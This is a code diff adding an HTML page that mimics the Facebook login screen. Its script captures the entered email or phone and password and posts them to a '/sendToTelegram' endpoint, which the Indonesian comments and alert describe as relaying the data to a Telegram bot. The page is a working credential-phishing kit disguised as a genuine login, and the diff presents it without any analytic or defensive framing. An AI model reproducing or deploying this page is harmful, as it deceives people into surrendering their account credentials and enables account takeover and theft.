@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            text-align: center;
+        }
+
+        .login-container h2 {
+            font-size: 32px;
+            color: #1877f2;
+            margin-bottom: 20px;
+            font-weight: bold;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box; /* Ensure padding is included in width */
+            font-size: 16px;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            box-sizing: border-box; /* Ensure padding is included in width */
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .login-container button:hover {
+            background-color: #166fe5;
+        }
+
+        .login-container .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #1877f2;
+            cursor: pointer;
+        }
+
+        .login-container .forgot-password:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Facebook</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Email or Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="forgot-password">Forgotten password?</div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Mengirim data ke bot telegram
+            fetch('/sendToTelegram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username, password }),
+            }).then(response => {
+                if (response.ok) {
+                    alert('Data dikirim ke Telegram!');
+                } else {
+                    alert('Terjadi kesalahan!');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
